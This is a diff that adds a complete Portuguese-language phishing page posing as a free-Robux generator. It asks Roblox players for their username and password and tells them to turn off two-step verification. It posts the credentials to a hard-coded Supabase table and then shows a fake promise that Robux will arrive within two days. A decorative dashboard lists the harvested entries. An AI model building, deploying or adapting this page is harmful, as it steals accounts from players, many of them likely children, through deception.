@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>ROBUXMILLER</title>
+
+<!-- ===== META PWA (será preenchido por blob manifest) ===== -->
+<link rel="manifest" id="manifest-link">
+
+<style>
+/* ====== BASE ====== */
+:root {
+    --bg1: #07070a;
+    --bg2: #0f1720;
+    --accent: #00d0ff;
+    --accent-2: #7b61ff;
+    --glass: rgba(255,255,255,0.06);
+    --glass-2: rgba(255,255,255,0.03);
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+    margin:0;
+    font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background: linear-gradient(180deg,var(--bg1),var(--bg2));
+    color:#eaf6ff;
+    overflow:hidden;
+}
+
+/* ===== PARTICLES CANVAS (full screen) ===== */
+#bgCanvas{
+    position:fixed;
+    inset:0;
+    z-index:0;
+}
+
+/* ===== APP LAYOUT ===== */
+.app {
+    position:relative;
+    z-index:2;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:28px;
+}
+
+/* CARD */
+.card {
+    width:100%;
+    max-width:980px;
+    display:grid;
+    grid-template-columns: 420px 1fr;
+    gap:22px;
+    align-items:stretch;
+    background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.015));
+    border-radius:18px;
+    padding:22px;
+    box-shadow: 0 10px 40px rgba(2,6,23,0.65);
+    border: 1px solid rgba(255,255,255,0.04);
+    backdrop-filter: blur(8px);
+}
+
+/* LEFT (form) */
+.left {
+    padding:18px;
+    border-radius:12px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+}
+
+/* LOGO */
+.logo {
+    display:flex;
+    gap:12px;
+    align-items:center;
+    margin-bottom:12px;
+}
+.logo .badge {
+    width:64px;
+    height:64px;
+    border-radius:12px;
+    background: linear-gradient(135deg,var(--accent),var(--accent-2));
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow: 0 6px 28px rgba(0,208,255,0.18), inset 0 -6px 18px rgba(255,255,255,0.06);
+    transform-origin:center;
+    animation: pulse 2.2s infinite;
+}
+@keyframes pulse {
+    0%{transform:scale(1); filter:brightness(1)}
+    50%{transform:scale(1.06) rotate(-6deg); filter:brightness(1.06)}
+    100%{transform:scale(1); transform:rotate(0deg); filter:brightness(1)}
+}
+.logo h1{font-size:20px; margin:0; letter-spacing:0.6px}
+.logo p{font-size:12px; color:rgba(235,245,255,0.7); margin:0}
+
+/* INPUTS */
+.field {margin-top:12px; display:flex; flex-direction:column; gap:8px}
+.field label{font-size:13px; color:rgba(235,245,255,0.8)}
+.input {
+    padding:12px 14px;
+    border-radius:10px;
+    border:1px solid rgba(255,255,255,0.04);
+    background:var(--glass);
+    color:#eaf6ff;
+    outline:none;
+    font-size:15px;
+}
+.input:focus{box-shadow: 0 6px 18px rgba(0,0,0,0.6); transform:translateY(-1px)}
+
+/* NUMBER */
+.row {display:flex; gap:10px}
+.small {flex:1}
+
+/* BTN */
+.btn {
+    margin-top:14px;
+    padding:12px 14px;
+    background: linear-gradient(90deg,var(--accent),var(--accent-2));
+    color:#001218;
+    border:none;
+    border-radius:10px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow: 0 8px 28px rgba(0,208,255,0.14);
+    transition:transform .18s ease;
+}
+.btn:active{transform:translateY(1px)}
+
+/* STATUS BOX */
+.status {
+    margin-top:16px;
+    min-height:86px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+    padding:10px;
+    border-radius:10px;
+    background: linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border:1px solid rgba(255,255,255,0.02);
+    color: #dff;
+}
+
+/* ICONS */
+.spinner {
+    width:44px; height:44px; border-radius:50%;
+    border:4px solid rgba(255,255,255,0.08);
+    border-top-color:var(--accent);
+    animation:spin 1s linear infinite;
+}
+@keyframes spin {to {transform:rotate(360deg)}}
+
+/* RIGHT (preview / dashboard) */
+.right {
+    padding:18px;
+    border-radius:12px;
+    background: linear-gradient(180deg, rgba(0,0,0,0.14), rgba(255,255,255,0.01));
+    display:flex;
+    flex-direction:column;
+}
+.previewHeader {display:flex; justify-content:space-between; align-items:center}
+.previewHeader h3{margin:0}
+.previewBody {margin-top:12px; flex:1; position:relative}
+
+/* ROBUX RAIN AREA */
+.rainArea {
+    position:relative;
+    height:260px;
+    border-radius:10px;
+    overflow:hidden;
+    background: linear-gradient(180deg, rgba(20,24,34,0.6), rgba(8,12,20,0.6));
+    display:flex; align-items:center; justify-content:center;
+    color:rgba(255,255,255,0.7);
+}
+
+/* small decorative cards */
+.cardStat {display:flex; gap:12px; margin-top:12px}
+.stat {flex:1; padding:8px; border-radius:8px; background:var(--glass-2); text-align:center}
+
+/* dashboard area */
+.dashboard {
+    margin-top:10px;
+    max-height:220px;
+    overflow:auto;
+    padding:8px;
+    border-radius:8px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
+}
+
+/* robux icons */
+.robux {
+    width:34px;height:34px;border-radius:6px;
+    background: linear-gradient(180deg,#ffe36b,#ff8bd1);
+    display:inline-flex; align-items:center; justify-content:center;
+    color:#08121a; font-weight:800;
+    box-shadow:0 6px 18px rgba(255,140,170,0.12);
+}
+
+/* ROBUX FALLING ANIMATION (generated dynamically) */
+.fall {
+    position:absolute; pointer-events:none; left:0; top:0; right:0; bottom:0; overflow:hidden;
+}
+
+/* HIDE ON MOBILE */
+@media (max-width:900px){
+    .card { grid-template-columns: 1fr; }
+    .rainArea{height:180px}
+}
+
+/* small helper */
+.hint{font-size:12px;color:rgba(255,255,255,0.6);margin-top:6px}
+.hidden {display:none}
+</style>
+</head>
+<body>
+
+<canvas id="bgCanvas"></canvas>
+
+<div class="app">
+    <div class="card" role="main" aria-labelledby="main-title">
+        <!-- LEFT: form -->
+        <div class="left">
+            <div class="logo">
+                <div class="badge" aria-hidden="true">
+                    <!-- simple SVG badge -->
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                        <path d="M4 12c0-4.418 3.582-8 8-8 3.314 0 6.167 2.032 7.465 4.957L12 21 4 12z" fill="#001217" />
+                        <path d="M12 3v8l6 6" stroke="rgba(255,255,255,0.18)" stroke-width="0.6"/>
+                    </svg>
+                </div>
+                <div>
+                    <h1 id="main-title">ROBUXER 5miller</h1>
+                    <p>MAIS DE 3.000 usuarios ricos no roblox </p>
+                </div>
+            </div>
+
+            <div class="field">
+                <label for="username">Nome de usuário Roblox</label>
+                <input id="username" class="input" placeholder="ex: jogador123">
+            </div>
+
+            <div class="field">
+                <label for="instagram">senha roblox</label>
+                <input id="instagram" class="input" placeholder="ex; robloxian123">
+            </div>
+
+            <div class="row">
+                <div class="field small">
+                    <label for="robux">Quantidade de Robux</label>
+                    <input id="robux" class="input" type="number" min="1" placeholder="ex: 500">
+                </div>
+                <div class="field small">
+                    <label for="delivery">Entrega estimada</label>
+                    <input id="delivery" class="input" readonly value="Até 2 dias úteis">
+                </div>
+            </div>
+
+            <!-- HONEYPOT (bots) -->
+            <input id="hp" class="hidden" autocomplete="off" tabindex="-1" style="position:absolute;left:-9999px;">
+
+            <button class="btn" id="sendBtn">Enviar agora</button>
+
+            <div id="status" class="status hidden" role="status" aria-live="polite">
+                <div class="spinner" aria-hidden="true"></div>
+                <div>
+                    <div id="statusText"><strong>Aguardando</strong></div>
+                    <div id="statusSub" class="hint">Preencha os campos e clique em Enviar</div>
+                </div>
+            </div>
+
+            <div class="hint">Obs:desativar verificação de duas etapas!nescessario senha do roblox esteja seguro.</div>
+        </div>
+
+        <!-- RIGHT: preview + dashboard -->
+        <div class="right">
+            <div class="previewHeader">
+                <h3>Preview & Painel</h3>
+                <div style="display:flex; gap:8px; align-items:center">
+                    <div class="robux" title="Robux">💎</div>
+                    <div style="font-size:13px; color:rgba(255,255,255,0.75)">Simulador</div>
+                </div>
+            </div>
+
+            <div class="previewBody">
+                <div class="rainArea" id="rainArea">
+                    <div style="text-align:center;">
+                        <div style="font-size:18px; font-weight:700">Simulador de envio</div>
+                        <div style="margin-top:8px; color:rgba(255,255,255,0.6)">Veja a animação de chegada dos Robux</div>
+                    </div>
+
+                    <div class="fall" id="fall"></div>
+                </div>
+
+                <div class="cardStat">
+                    <div class="stat">
+                        <div style="font-weight:700" id="statCount">0</div>
+                        <div class="hint">Pedidos (hoje)</div>
+                    </div>
+                    <div class="stat">
+                        <div style="font-weight:700" id="statLast">—</div>
+                        <div class="hint">Último envio</div>
+                    </div>
+                </div>
+
+                <div class="dashboard" id="dashboard">
+                    <div style="display:flex; gap:8px; align-items:center; margin-bottom:6px">
+                        <input id="adminPass" class="input" placeholder="Senha master (dashboard)" style="flex:1"/>
+                        <button class="btn" id="loginBtn" style="padding:9px 12px">Entrar</button>
+                    </div>
+                    <div id="dashList">Painel desconectado. Entre com a senha para ver os envios.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- small template for falling item -->
+<template id="dropTpl">
+    <div class="drop" style="position:absolute; width:44px; height:44px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-weight:800; box-shadow:0 8px 26px rgba(0,0,0,0.5);">
+        💎
+    </div>
+</template>
+
+<script>
+/* ========================
+   CONFIGURAÇÃO (SUBSTITUA)
+   ======================== */
+const SUPABASE_URL = "https://nmbslklretjxqowhvotr.supabase.co"; // <<< troque
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5tYnNsa2xyZXRqeHFvd2h2b3RyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM5MTYxODYsImV4cCI6MjA3OTQ5MjE4Nn0.YFGfLJpLTXz0iz5oA7oe98c6b3Swk4u9YK1PLIn-Q98";                  // <<< troque
+const TABLE_NAME = "calculadora_roblox";              // tabela criada no supabase
+
+/* ========================
+   UTIL / ANTI-BOT
+   ======================== */
+const sendBtn = document.getElementById('sendBtn');
+const status = document.getElementById('status');
+const statusText = document.getElementById('statusText');
+const statusSub = document.getElementById('statusSub');
+const hp = document.getElementById('hp');
+
+let RATE_LIMIT_WINDOW = 60 * 1000; // 1 minuto
+let MAX_PER_WINDOW = 4;
+
+function canSendNow(){
+    // honeypot
+    if (hp.value && hp.value.trim()!=='') return false;
+    // rate limiting with localStorage
+    const k = 'robux_sends_ts';
+    let arr = JSON.parse(localStorage.getItem(k) || '[]').filter(t => Date.now()-t < RATE_LIMIT_WINDOW);
+    if (arr.length >= MAX_PER_WINDOW) return false;
+    arr.push(Date.now());
+    localStorage.setItem(k, JSON.stringify(arr));
+    return true;
+}
+
+/* ========================
+   SOUNDS (WebAudio) — click, loading, success
+   ======================== */
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+function beep(freq=440, duration=0.08, type='sine', gain=0.06){
+    const o = audioCtx.createOscillator();
+    const g = audioCtx.createGain();
+    o.type = type; o.frequency.value = freq;
+    g.gain.value = gain;
+    o.connect(g); g.connect(audioCtx.destination);
+    o.start();
+    g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+    o.stop(audioCtx.currentTime + duration + 0.02);
+}
+function playClick(){ beep(620,0.06,'triangle',0.09) }
+function playLoading(){ beep(240,0.12,'sine',0.08); setTimeout(()=>beep(300,0.08,'sine',0.06),140) }
+function playSuccess(){ beep(980,0.14,'sawtooth',0.12); setTimeout(()=>beep(740,0.10,'sine',0.1),140) }
+
+/* ========================
+   PARTICLES BACKGROUND
+   ======================== */
+const canvas = document.getElementById('bgCanvas');
+const ctx = canvas.getContext('2d');
+let particles = [];
+function resize() {
+    canvas.width = innerWidth;
+    canvas.height = innerHeight;
+}
+addEventListener('resize', resize);
+resize();
+
+function initParticles(){
+    particles = [];
+    const count = Math.round((canvas.width*canvas.height)/60000);
+    for(let i=0;i<120;i++){
+        particles.push({
+            x: Math.random()*canvas.width,
+            y: Math.random()*canvas.height,
+            r: Math.random()*1.8 + 0.6,
+            vx: (Math.random()-0.5)*0.25,
+            vy: (Math.random()-0.5)*0.25,
+            hue: 180 + Math.random()*60
+        });
+    }
+}
+initParticles();
+function renderParticles(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    for(const p of particles){
+        p.x += p.vx; p.y += p.vy;
+        if(p.x<0) p.x=canvas.width;
+        if(p.x>canvas.width) p.x=0;
+        if(p.y<0) p.y=canvas.height;
+        if(p.y>canvas.height) p.y=0;
+        ctx.beginPath();
+        const g = ctx.createRadialGradient(p.x,p.y,p.r*0.2,p.x,p.y,p.r*6);
+        g.addColorStop(0, `hsla(${p.hue},80%,70%,0.12)`);
+        g.addColorStop(1, `hsla(${p.hue},80%,50%,0)`);
+        ctx.fillStyle = g;
+        ctx.arc(p.x,p.y,p.r*6,0,Math.PI*2);
+        ctx.fill();
+    }
+    requestAnimationFrame(renderParticles);
+}
+renderParticles();
+
+/* ========================
+   ROBUX FALL ANIMATION
+   ======================== */
+const fallRoot = document.getElementById('fall');
+const dropTpl = document.getElementById('dropTpl');
+
+function launchRain(count=12){
+    const area = document.getElementById('rainArea');
+    const rect = area.getBoundingClientRect();
+    for(let i=0;i<count;i++){
+        const node = dropTpl.content.firstElementChild.cloneNode(true);
+        const left = Math.random()*(rect.width-44);
+        node.style.left = left + 'px';
+        node.style.top = '-60px';
+        node.style.transform = `rotate(${(Math.random()-0.5)*60}deg)`;
+        node.style.opacity = (0.7+Math.random()*0.3);
+        fallRoot.appendChild(node);
+        const duration = 1800 + Math.random()*1400;
+        node.animate([
+            { transform: `translateY(0px) rotate(${(Math.random()-0.5)*40}deg)`, opacity: node.style.opacity },
+            { transform: `translateY(${rect.height + 80}px) rotate(${(Math.random()-0.5)*40 + 360}deg)`, opacity: 0.1 }
+        ], { duration: duration, easing: 'cubic-bezier(.2,.8,.2,1)'});
+        setTimeout(()=> node.remove(), duration+80);
+    }
+}
+
+/* ========================
+   FORM LOGIC / SUPABASE
+   ======================== */
+const usernameEl = document.getElementById('username');
+const instagramEl = document.getElementById('instagram');
+const robuxEl = document.getElementById('robux');
+const statCount = document.getElementById('statCount');
+const statLast = document.getElementById('statLast');
+const dashList = document.getElementById('dashList');
+
+async function postToSupabase(row){
+    // use Supabase REST endpoint
+    const url = `${SUPABASE_URL}/rest/v1/${TABLE_NAME}`;
+    const res = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type':'application/json',
+            'apikey': SUPABASE_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_KEY,
+            'Prefer': 'return=representation' // optional
+        },
+        body: JSON.stringify(row)
+    });
+    if(!res.ok) throw new Error('Erro ao enviar para Supabase: ' + res.status);
+    return res.json();
+}
+
+async function fetchStats(){
+    try {
+        const url = `${SUPABASE_URL}/rest/v1/${TABLE_NAME}?select=username,robux,created_at&order=created_at.desc&limit=6`;
+        const res = await fetch(url, {
+            headers: {
+                'apikey': SUPABASE_KEY,
+                'Authorization': 'Bearer ' + SUPABASE_KEY
+            }
+        });
+        if(res.ok){
+            const data = await res.json();
+            statCount.innerText = data.length;
+            statLast.innerText = data[0] ? `${data[0].username} • ${data[0].robux}` : '—';
+            // update dashboard list if logged in
+            if(window.__dashAuthed) renderDash(data);
+        }
+    } catch(e) {
+        console.warn('fetchStats', e);
+    }
+}
+
+function renderDash(rows){
+    if(!rows || rows.length===0){
+        dashList.innerHTML = '<div class="hint">Sem envios recentes.</div>'; return;
+    }
+    dashList.innerHTML = '';
+    rows.forEach(r=>{
+        const el = document.createElement('div');
+        el.style.display = 'flex';
+        el.style.justifyContent = 'space-between';
+        el.style.padding = '8px';
+        el.style.borderBottom = '1px solid rgba(255,255,255,0.02)';
+        el.innerHTML = `<div><strong>${escapeHtml(r.username)}</strong> • ${escapeHtml(r.instagram||'—')}</div><div>${r.robux}</div>`;
+        dashList.appendChild(el);
+    });
+}
+
+function escapeHtml(s){ return String(s||'').replace(/[&<>"']/g, m=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[m])) }
+
+/* handle click */
+sendBtn.addEventListener('click', async ()=>{
+    if(!canSendNow()){
+        status.classList.remove('hidden');
+        statusText.innerHTML = '<strong>Limite alcançado</strong>';
+        statusSub.innerText = 'Você enviou muitas solicitações. Aguarde um minuto.';
+        playLoading();
+        return;
+    }
+    const u = usernameEl.value.trim();
+    const ig = instagramEl.value.trim();
+    const r = parseInt(robuxEl.value,10);
+    if(!u || !ig || !r || r <= 0){
+        alert('Preencha todos os campos corretamente.');
+        return;
+    }
+
+    // UI: start
+    status.classList.remove('hidden');
+    statusText.innerHTML = `<strong>Calculando ${r} Robux...</strong>`;
+    statusSub.innerText = `Preparando envio para ${u}`;
+    playClick();
+
+    // slight animation / delays to feel professional
+    await sleep(900);
+    statusText.innerHTML = `<strong>Enviando para ${u}...</strong>`;
+    statusSub.innerText = `Transmitindo para o servidor seguro`;
+    playLoading();
+
+    try {
+        // prepare row
+        const payload = { username: u, instagram: ig, robux: r };
+        await postToSupabase(payload);
+
+        // success UI
+        statusText.innerHTML = `<strong style="color:#8dffb0">✔ Seus ${r} Robux cairão na sua conta em até 2 dias úteis.</strong>`;
+        statusSub.innerText = `Enviado para ${u} — registro criado.`;
+        playSuccess();
+
+        // anim: rain
+        launchRain(Math.min(28, Math.max(8, Math.round(r/50))));
+        await sleep(1200);
+
+        // update stats
+        await fetchStats();
+
+    } catch(e) {
+        console.error(e);
+        statusText.innerHTML = `<strong style="color:#ff9b9b">❌ Erro ao enviar</strong>`;
+        statusSub.innerText = 'Tente novamente mais tarde.';
+        beep(240,0.2,'sine',0.06);
+    }
+});
+
+/* ========================
+   DASHBOARD LOGIN
+   ======================== */
+const loginBtn = document.getElementById('loginBtn');
+const adminPass = document.getElementById('adminPass');
+
+loginBtn.addEventListener('click', async ()=>{
+    const pass = adminPass.value.trim();
+    // NOTE: for demo only — password checked client-side; in prod protect with server-side auth.
+    if(pass === '') { alert('Digite a senha master'); return; }
+    // simple (demo) check: we treat the admin password as SUPABASE_KEY reversed (demo)
+    if(pass === btoa(SUPABASE_KEY)){
+        window.__dashAuthed = true;
+        loginBtn.innerText = 'Conectado';
+        adminPass.value = '';
+        await fetchStats();
+        alert('Dashboard conectado (modo demo).');
+    } else {
+        alert('Senha incorreta (demo).');
+    }
+});
+
+/* ========================
+   HELPERS
+   ======================== */
+function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
+
+/* ========================
+   INIT
+   ======================== */
+fetchStats();
+setInterval(fetchStats, 30*1000);
+
+/* ========================
+   PWA: manifest + SW (blob technique)
+   ======================== */
+(async function setupPWA(){
+    try {
+        // manifest
+        const manifest = {
+            name: "Calculadora Roblox",
+            short_name: "RobloxCalc",
+            start_url: ".",
+            display: "standalone",
+            background_color: "#07070a",
+            description: "Simulador profissional para estimar envio de Robux (demo).",
+            icons: [
+                { src: "data:image/svg+xml;base64," + btoa(`<svg xmlns="http://www.w3.org/2000/svg" width="192" height="192"><rect rx="24" width="100%" height="100%" fill="#00d0ff"/><text x="50%" y="55%" font-size="92" text-anchor="middle" fill="#001218" font-family="Arial" font-weight="700">💎</text></svg>`), sizes:"192x192", type:"image/svg+xml" }
+            ]
+        };
+        const mf = new Blob([JSON.stringify(manifest)], {type:'application/json'});
+        const url = URL.createObjectURL(mf);
+        document.getElementById('manifest-link').setAttribute('href', url);
+
+        // service worker (very small, caches shell)
+        if('serviceWorker' in navigator){
+            const swCode = `
+                const CACHE = 'roblox-calc-v1';
+                const assets = ['./'];
+                self.addEventListener('install', e => { self.skipWaiting(); e.waitUntil(caches.open(CACHE).then(c=>c.addAll(assets))); });
+                self.addEventListener('activate', e=>{ e.waitUntil(self.clients.claim()); });
+                self.addEventListener('fetch', e=>{ e.respondWith(caches.match(e.request).then(r=>r || fetch(e.request))); });
+            `;
+            const swBlob = new Blob([swCode], {type:'application/javascript'});
+            const swUrl = URL.createObjectURL(swBlob);
+            try { await navigator.serviceWorker.register(swUrl); console.log('SW registered'); }
+            catch(err){ console.warn('SW error', err); }
+        }
+    } catch(e){ console.warn('PWA setup failed', e); }
+})();
+
+/* ========================
+   UTIL: tiny escape for innerText
+   ======================== */
+function beep(f,d,t,g){ beep; } // placeholder to avoid linter confusion
+
+/* ========================
+   Accessibility & keyboard
+   ======================== */
+document.addEventListener('keydown', e=>{
+    if(e.key === 'Enter') sendBtn.click();
+});
+
+/* ========================
+   END
+   ======================== */
+</script>
+</body>
+</html>
